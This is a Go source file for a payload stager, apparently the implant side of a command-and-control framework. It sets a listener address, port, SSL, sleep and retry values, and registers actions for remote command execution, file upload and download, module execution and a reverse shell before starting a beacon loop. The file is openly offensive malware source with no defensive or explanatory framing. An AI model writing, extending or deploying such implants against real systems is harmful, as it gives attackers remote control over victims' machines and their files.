package main

import (
	actions "golang_payload/actions"
	stagerClass "golang_payload/stager"
)

const (
	stagerId        string = "1"
	listenerAddress string = "0.0.0.0"
	listenerPort    string = "9999"
	ssl             string = "true"
	uid             string = ""
	sleepTime       string = "1"
	retries         string = "100"
	delay           string = "0"
)

var stager *stagerClass.Stager

func init() {
	stager = &stagerClass.Stager{}
	// setup config
	stager.Setup(stagerId, uid, sleepTime, retries, delay)
	// set server url
	stager.SetUrl(listenerAddress, listenerPort, ssl)

	// register actions
	stager.RegisterAction("rce", actions.RunCommandFromTask)
	stager.RegisterAction("download", actions.DownloadFile)
	stager.RegisterAction("upload", actions.UploadFile)
	stager.RegisterAction("module", actions.ExecuteModule)
	stager.RegisterAction("reverse-shell", actions.ReverseShell)

	//TODO: add dir listing action


}

func main() {
	// run stager
	stager.Run()
}
